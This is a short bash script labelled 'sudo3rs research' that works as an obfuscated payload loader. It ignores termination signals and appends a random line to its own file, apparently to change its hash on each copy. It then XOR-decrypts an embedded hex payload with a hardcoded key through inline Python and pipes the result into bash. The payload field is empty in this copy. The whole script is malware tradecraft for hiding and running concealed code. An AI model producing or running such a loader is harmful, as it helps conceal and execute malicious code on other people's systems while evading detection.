#!/bin/bash
# jomok.sh -sudo3rs research
trap "" SIGINT SIGTERM SIGHUP
export P_HEX=""
export K_HEX="582d00d3331e9a4b87f5b198bf978b9893ac7cb9caa007135b51f72c7f4c8ed9"
export SELF_PATH=$(readlink -f "$0")
[ -w "$SELF_PATH" ] && echo "# Instance: $RANDOM" >> "$SELF_PATH" 2>/dev/null
python3 - << "EOF" | bash -s -- "$SELF_PATH"
import os
p = bytes.fromhex(os.environ["P_HEX"])
k = bytes.fromhex(os.environ["K_HEX"])
print(bytes([b ^ k[i % len(k)] for i, b in enumerate(p)]).decode())
EOF
